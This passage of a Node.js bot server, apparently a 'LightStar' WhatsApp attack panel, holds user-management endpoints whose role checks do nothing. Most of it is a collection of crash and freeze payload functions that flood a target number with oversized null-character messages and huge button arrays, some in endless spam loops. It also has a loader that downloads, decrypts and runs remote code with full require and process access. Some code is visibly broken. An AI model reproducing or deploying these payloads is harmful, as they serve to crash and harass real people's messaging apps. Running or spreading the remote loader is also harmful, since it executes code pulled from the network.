    `━━━━━━━━━━━━━━━━━━━\n` +
    `🔹 *LightStar Project*`;

  try {
    await sendTelegramNotif(notifUA);
    console.log('[NOTIF USERADD ✅] Notif terkirim');
  } catch (e) {
    console.error('[NOTIF USERADD ❌]', e.message);
  }
  // ============================

  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!editor || !['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner'].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    
  }

  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Owner bisa edit owner lain, hapus blok pengecekan khusus

  const roleLevel = {
    founder: 12,
    developer: 11,
    ceo: 10,
    tk: 9,
    "high owner": 8,
    owner: 7,
    moderator: 6,
    partner: 5,
    admin: 4,
    vip: 3,
    reseller: 2,
    member: 1
  };
  
  // Owner bisa edit owner lain (level sama)
  if (roleLevel[editor.role] < roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with higher rank." });
  }

  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});


app.get("/getStats", (req, res) => {

  const db = loadDatabase();
  const totalUsers = db.length;

  // FIX: Online user = yang benar-benar terkoneksi WS saat ini
  const onlineUsers = Object.keys(wsClients).length;

  // Hitung per role
  const roleCount = {};
  db.forEach(u => {
    const r = u.role || "member";
    roleCount[r] = (roleCount[r] || 0) + 1;
  });

  return res.json({
    valid: true,
    totalUsers,
    onlineUsers,
    roleCount
  });
});

// Alias /stats → sama dengan /getStats
app.get("/stats", (req, res) => { req.url = "/getStats?" + (req.url.split("?")[1]||""); app.handle(req, res); });

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || !["founder", "developer, 'ceo"].includes(user.role)) {
    
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;
async function elynn(sock, target) {
  await Promise.all(
    Array(40).fill(null).map(() =>
      sock.relayMessage("status@broadcast", {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11111111_222222222222222_3333333333333333333_n.enc?stp=dst-mp4&ccb=11-4",
          mimetype: "video/mp4",
          fileSha256: Buffer.from("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "hex"),
          fileLength: 999999,
          seconds: 10,
          height: 640,
          width: 640,
          mediaKey: Buffer.from("a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2", "hex"),
          fileEncSha256: Buffer.from("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "hex"),
          directPath: "/v/t62.7118-24/11111111_222222222222222_3333333333333333333_n.enc?type=md",
          mediaKeyTimestamp: Math.floor(Date.now() / 1000),
          caption: ("\u202E\u202D\u200F\u200E\u202A\u202B\u202C\u200B\u200C\u200D\u034F\u2800\u3164\uFFA0\u115F\u1160\u4E00\u9FFF\u3400\u4DBF\u{20000}\u{2A6DF}\u{2A700}\u{2B73F}\u{2B740}\u{2B81F}\u{2B820}\u{2CEAF}").repeat(5000),
          contextInfo: {
            mentionedJid: Array(100).fill(target),
            isGroupStatus: true,
            forwardingScore: 999,
            isForwarded: true
          }
        }
      }, {
        statusJidList: [target],
        messageId: "ELYNN-ABECEDE-" + Date.now() + "-" + Math.floor(Math.random() * 999999),
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      })
    )
  )
}

async function CrashMemek(number) {
    await sock.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "VnF",
                        locationMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "`ꦻ⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ោ࣯࣯៝" + "\0".repeat(900000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0"
                    },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: number } });
}

async function blankClick(sock, target) {
  const rellMsg = {
    interactiveResponseMessage: {
      body: { 
        text: "ꦽ".repeat(90000) + "ꦾ".repeat(90000) 
      },
      nativeFlowResponseMessage: {
        name: "contact_button",
        params: JSON.stringify({
          displayName: "ꦽ".repeat(90000) + "ꦾ".repeat(90000),
          phoneNumber: "9999999999"
        })
      },
      contextInfo: {
        quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: "ꦽ".repeat(90000) + "ꦾ".repeat(90000)
            },
            nativeFlowResponseMessage: {
              name: "contact_button",
              params: JSON.stringify({
                displayName: "ꦽ".repeat(90000) + "ꦾ".repeat(90000)
              })
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, BillyMsg, {});
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
}

async function SansV12(sock, target) {
    try {
        const msg = {
            interactiveMessage: {
                body: {
                    text: "\u0000".repeat(60000)
                },
                nativeFlowMessage: {
                    buttons: "view_ai_message".repeat(30000)
                }
            }
        };

        const msg2 = {
            interactiveMessage: {
                body: {
                    text: "☣❈₳₩₩༼₴₳₦₴❈§✺☠🍷" + "\u0000".repeat(50000) + "\u1A01".repeat(50000)
                },
                nativeFlowMessage: {
                    buttons: "grock.ai".repeat(30000)
                }
            }
        };

        const msg3 = {
            interactiveMessage: {
                body: {
                    text: "\u0000".repeat(50000) + "\u1A01".repeat(30000) + "\u600b".repeat(20000)
                },
                nativeFlowMessage: {
                    buttons: "ꦾꦾꦾꦾ".repeat(50000)
                }
            }
        };
        
        const msg4 = {
                        interactiveMessage: {
                body: {
                    text: "SansNew" + "\u0000".repeat(50000) + "\u1A01".repeat(30000) + "\u700b".repeat(20000)
                },
                nativeFlowMessage: {
                    buttons: "search_ai_news".repeat(30000)
                }
            }
        };
    
      const msg5 = {
                interactiveMessage: {
        body: {
          text: "xxznz₩°🍍"
        },
        nativeFlowMessage: {
          buttons: "\0".repeat(230000) + " .repeat(2000) " +
                   " repeat(20000) " +
                   " meta_mesaage) " +
                   " repeat(1000)" +
                   "crash_mesage"
        }
      }
    };
    await sock.relayMessage(target, msg, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          stickerPackMessage: {
            stickerPackId: "\0".repeat(1000),
            name: "Exposed",
            publisher: "\0".repeat(1000),
            fileLength: 9999,
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            contextInfo: {
              statusAttributionType: 2,
              statusAttributions: Array.from({ length: 200000 }, () => ({ type: 1 }))
            }
          }
        }
      }
    }, {});


        await sock.relayMessage(target, msg, {
            participant: { jid: target }
        });
        console.log("[+] Proses kirim Bug", target);

        await sock.relayMessage(target, msg2, {
            participant: { jid: target }
        });
        console.log("[+] Bug berhasil ke kirim ke", target);

        await sock.relayMessage(target, msg4, {
            participant: { jid: target }
        });
        console.log("[+] Bug berhasil ke kirim ke", target);

        console.log("[+] Bug SELESAI ke", target);

        await sock.relayMessage(target, msg3, {
            participant: { jid: target }
        });
        console.log("[+] Bug berhasil ke kirim ke", target);

        await sock.relayMessage(target, msg5, {
            participant: { jid: target }
        });
        console.log("[+] Bug berhasil ke kirim ke", target);
        
    } catch (e) {
        console.log("[-] Error Bug di mana aja:", e.message || e);
    }
}

async function crashX(sock, target) {
await sock.relayMessage(target, {
senderKeyDistributionMessage: {
groupId: "120363428445623974@g.us",
axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
},
interactiveMessage: {
body: {
text: "LightShadowIzinTampil😈☠️💀"
},
nativeFlowMessage: {
buttons: [
{
name: "catalog_message",
buttonParamsJson: "{}"
}
],
messageParamsJson: "{}"
}
}
},
{
additionalNodes: [
{
tag: "biz",
attrs: {
native_flow_name: "catalog_message"
}
}
]
});
}

async function BlankGroup(target) {
    await langgxyz.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "\u0003".repeat(200000) },
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            payment_currency: "BTC",
                            payment_amount: 0
                        })
                    }
                }
            }
        }
    }, {});
}

async function groupbug(sock, target) {
    try {
        const msg = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Deffa is here".repeat(10000)
                        },
                        footer: {
                            text: "\uFDFD" + "\uFDFD".repeat(110000)
                        },
                        nativeFlowMessage: {
                            extra: "\uFDFD".repeat(110000),
                            buttons: "\uFDFD".repeat(110000),
                            nativeFlowResponsMessage: {
                                buttons: "\u0000".repeat(110000)
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {});
    } catch (err) {
        console.error("Error:", err);
    }
}

async function DelayInvisble(target) {
    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "¿¿Ran is here¿?" + "\u0000".repeat(50000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 50000 }, () => ({})),
                        extra1: "\u0000".repeat(30000),
                        extra2: "\u0000".repeat(30000),
                        extra3: "\u0000".repeat(30000)
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () =>
                            Math.floor(Math.random() * 9000000000) + "@s.whatsapp.net"
                        ),
                        forwardingScore: 999999999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {});
}

async function CrashHomeNew(target) {
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0BF6".repeat(50000) + "‼️⃟Créditos : ?⃟꙰ 𝑭𝑼𝑵𝑪𝑨𝑹Ø 𝑨𝑵𝑻𝑰 𝑨𝑴𝑷𝑨𝑺 ✶⤻꙳‌‌༑ᐧ‌⌁ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱ 𑇂𑆵𑆴𑆿" + "\u0000".repeat(50000)
                    },
                    nativeFlowMessage: {
                        extra: "\u0BF6".repeat(50000),
                        buttons: "A".repeat(20000)
                    }
                }
            }
        }
    }

    await sock.relayMessage(target, msg1, {})

    const msg2 = {
        interactiveMessage: {
            body: {
                text: "‼️⃟Créditos : ?⃟꙰ 𝑭𝑼𝑵𝑪𝑨𝑹Ø 𝑨𝑵𝑻𝑰 𝑨𝑴𝑷𝑨𝑺 ✶⤻꙳‌‌༑ᐧ‌⌁ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱ 𑇂𑆵𑆴𑆿" + "\u0000"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    }

    await sock.relayMessage(target, msg2, {})

    const msg3 = {
        interactiveMessage: {
            body: {
                text: "‼️⃟Créditos : ?⃟꙰ 𝑭𝑼𝑵𝑪𝑨𝑹Ø 𝑨𝑵𝑻𝑰 𝑨𝑴𝑷𝑨𝑺 ✶⤻꙳‌‌༑ᐧ‌⌁ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱ 𑇂𑆵𑆴𑆿"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 1000 }, () => ({}))
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () =>
                    Math.floor(Math.random() * 9000000000) + "@s.whatsapp.net"
                ),
                forwardingScore: 999999999,
                isForwarded: true
            }
        }
    }

    await sock.relayMessage(target, msg3, {})
}

async function StuckHome(sock, target) {
    const msg = {
        messageType: 3,
        mediaMetadata: {},
        Livelocationmesaage: {},
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Ran is here"
                    },
                    nativeFlowMessage: {
                        extra: "\u31040",
                        buttons: "A".repeat(60000),
                        extra1: "\u0000".repeat(5555) + "\u0000",
                        extra2: "\u0000",
                        extra3: "\u0000",
                        extra4: "\u0000",
                        extra5: "\u0000",
                        name: "catalog_mesaage",
                        carouselMessage: {
                            cards: [
                                {
                                    cardIdentifier: "card_1",
                                    cardType: 1,
                                    components: [
                                        {
                                            type: "hatam",
                                            text: "awet muda"
                                        },
                                        {
                                            type: "23",
                                            text: "kartu0000"
                                        },
                                        {
                                            type: "0927383",
                                            text: "dananumber"
                                        },
                                        {
                                            type: "buttons",
                                            buttons: [
                                                {
                                                    name: "quick_reply",
                                                    buttonParamsJson: JSON.stringify({
                                                        display_text: "Klik"
                                                    })
                                                }
                                            ]
                                        }
                                    ]
                                },
                                {
                                    cardIdentifier: "card_2",
                                    cardType: 1,
                                    components: [
                                        {
                                            type: "header",
                                            text: "im Ran😈😈"
                                        },
                                        {
                                            type: "paymet",
                                            text: "im Ran😈😈"
                                        }
                                    ]
                                }
                            ]
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {});
}

async function crash1(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(500000),
},
},
},
},
}, { participant: { jid: target }});
}

async function crash2(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
messageParamsJson: "{}".repeat(500000),
},
},
},
},
}, { participant: { jid: target }});
}

async function crash3(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
messageParamsJson: "[".repeat(500000),
},
},
},
},
}, { participant: { jid: target }});
}

async function crash4(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
messageParamsJson: "[]".repeat(500000),
},
},
},
},
}, { participant: { jid: target }});
}

async function crash5(sock, target) {
await sock.relayMessage(target, {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
messageParamsJson: "\u0000".repeat(500000),
},
},
},
},
}, { participant: { jid: target }});
}

async function DelayInvisBapakLowh(sock, target) {
  while (true) {
    try {   
      const VnfMsg = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {                     
              body: {
                text: ".../",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "cta_Vnf",
                paramsJson: {\"flow_cta\":\"${"\u0000".repeat(900000)}\"}},
                version: 3
              }
            }
          }
        }
      };

      await sock.relayMessage(target, VnfMsg, { 
        participant: { jid: target } 
      });
      
      console.log(Delay Hard successfully spammed to ${target});

      await new Promise(resolve => setTimeout(resolve, 1500));

    } catch (e) {
      console.log("❌ Error Strike:", e);
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }

async function ingpisible(sock, target) {
  const r = (str, n) => str.repeat(n);
  const aray = Array.from({ length: 500000 }, () => ({}));
  
  try {
    for (let i = 0; i < 50; i++) {
      const msg1 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "x",
              },
              nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({})),
                nativeFlowResponsMessage: {
                  buttons: Array.from({ length: 500000 }, () => ({})),
                },
              },
            },
          },
        },
      };

      const msg2 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                buttons: Array.from({ length: 500000 }, () => ({})),
              },
              nativeFlowMessage: {
                extra1: {
                  "\u2797": "" 
                },
                extra2: {
                  "\u27BF": "" 
                },
                buttons: Array.from({ length: 500000 }, () => ({})),
              }
            }
          }
        }
      };

      const msg3 = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: r("\x9234", 60000)
              },
              nativeFlowMessage: {
                extra: {
                  "\u{31040}": "" 
                },
                buttons: Array.from({ length: 500000 }, () => ({})),
              }
            }
          }
        }
      };

      await sock.relayMessage(target, msg1, {
        participant: { jid: target }
      });
      
      await sock.relayMessage(target, msg3, {
        participant: { jid: target }
      });
      
      await sock.relayMessage(target, msg2, {
        participant: { jid: target }
      });
    }
  } catch (err) {
    console.error("Error:", err);
  }
}

async function delayspam(sock, target) {
  for (let i = 0; i < 5; i++) {
    try {
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "A҉T҉X҉ J҉I҉R҉" + "\0".repeat(100000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\0" + "\x10"
              }
            }
          }
        }
      }, {
        participant: target,
        messageId: '-' + Date.now() + '-' + i
      });
    } catch (e) {
      console.log('ERROR JIR WKWK:', e.message);
    }
  }
}

async function BlankFreezeChatGroup(sock, target) {
  const msg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  };
  
  const prepared = await generateWAMessageFromContent(target, msg, {});
  await sock.relayMessage(target, prepared.message, {
    messageId: prepared.key.id
  });
}

async function crasHidd(sock, target) {
  const MakLo = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "MakLo¡!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 499999 }, () => ({}))
}
}
}
}
};

const msg = generateWAMessageFromContent(target, MakLo, {});

await sock.relayMessage(target, msg.message, {
  messageId: msg.key.id
})
await sleep(1000);
}

async function FrezeeXDelayGorup(sock, target) {
  const msg1 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "MakLo(RcB)"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 499999 }, () => ({}))
          }
        }
      }
    }
  };
  const prepared1 = generateWAMessageFromContent(target, msg1, {});
  await sock.relayMessage(target, prepared1.message, { messageId: prepared1.key.id });
  
}
async function FrezeeXDelayGorup(sock, target) {
  const msg1 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "MakLo(RcB)"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 499999 }, () => ({}))
          }
        }
      }
    }
  };
  const prepared1 = generateWAMessageFromContent(target, msg1, {});
  await sock.relayMessage(target, prepared1.message, { messageId: prepared1.key.id });

  const MakLo3 = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
              }
            }
          }
        }
      }
    }
  };
  const msg3 = generateWAMessageFromContent(target, MakLo3, {});
  await sock.relayMessage(target, msg3.message, { messageId: msg3.key.id });
}

async function buggroupblank(sock, targetJid) {
    try {
        const msg = {
          viewOnceMessageV2Extension: {
            message: {
            interactiveMessage: {
                body: {
                    text: "\uFDFD".repeat(100000)
                },
                nativeFlowMessage: {
                    buttons: "\u1400".repeat(100000)
                }
            }
                }
            }
        };

        await sock.relayMessage(targetJid, msg, {});
        console.log("sukses anj");
    } catch (e) {
        console.log("yahaha Error:", e.message || e);
    }
}
   
async function sangek(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);
  
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }
 }

async function FrezeeChatnih(sock, target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "BeliKondomMuluLuAnj😂"
            },
            nativeFlowMessage: {
              buttons: [
{
   name: "review_and_pay",
   buttonParamsJson: JSON.stringify({
      currency: "IDR",
      total_amount: { 
      value: 999999999999, 
      offset: 100 
      },
      reference_id: "\u0000".repeat(5000),
      order: {
      status: "pending",
      items: [
      {
      name: "饝噦饝喌饝喆饝喛".repeat(9999),
      amount: { value: 100000, offset: 100 },
      quantity: 99999
            }
         ]
      }
   })
}
],
},
},
}, { participant: { jid: target }});

await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'饝噦饝喌饝喆饝喛'.repeat(90000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"BeliKondomMuluLuAnj😂","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function BlankHardXbulldo(sock, target) {
  console.log( Blank Hard Succes sent to ${target})
  
  for (let i = 0; i < 50; i++) {
    let payload1 = {
      text: '\u0000'.repeat(900000) + '\uFFFF'.repeat(500000) + 'ꦽ'.repeat(400000)
    }
    
    let payload2 = {
      react: {
        text: '\u0000'.repeat(25000) + 'ꦾ'.repeat(30000),
        key: {
          remoteJid: target,
          fromMe: true,
          id: 'Garam madu'.repeat(5000) + i
        }
      }
    }
    
    let deepContext = {}
    for (let x = 0; x < 100; x++) {
      deepContext = {
        quotedMessage: {
          conversation: '\u0000'.repeat(50000) + 'ꦽꦾ'.repeat(20000),
          contextInfo: deepContext
        }
      }
    }
    
    let payload3 = {
      text: '\u0000'.repeat(700000) + 'VnX'.repeat(30000),
      contextInfo: deepContext
    }
    
    let payload4 = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1283783946799@newsletter",
        newsletterName: "🔥" + "ꦽ".repeat(300000),
        caption: "💀" + "ꦾ".repeat(300000),
        inviteExpiration: "9999999999999999"
      }
    }
    
    await sock.sendMessage(target, payload1).catch(e => console.log("err1"))
    await sock.sendMessage(target, payload2).catch(e => console.log("err2"))
    await sock.sendMessage(target, payload3).catch(e => console.log("err3"))
